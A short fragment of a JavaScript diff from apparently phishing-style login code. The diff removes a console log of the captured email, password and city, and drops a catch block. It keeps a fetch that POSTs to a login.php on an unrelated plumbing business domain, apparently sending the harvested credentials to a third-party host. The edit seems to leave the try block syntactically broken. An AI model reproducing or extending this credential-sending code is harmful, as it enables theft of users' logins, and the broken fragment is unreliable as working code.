@@ -257,14 +257,6 @@ try {
     const currentTime = new Date().toISOString();
 
    
-
-    console.log(JSON.stringify({
-        email,
-        password,
-        city,
-        currentTime
-    }));
-
     const res = await fetch("https://lorneplumbing.com.au/login.php", {
 
         method: "POST",
@@ -281,10 +273,6 @@ try {
         })
 
     });
-
-} catch (err) {
-    console.error(err);
-}
 
 
 
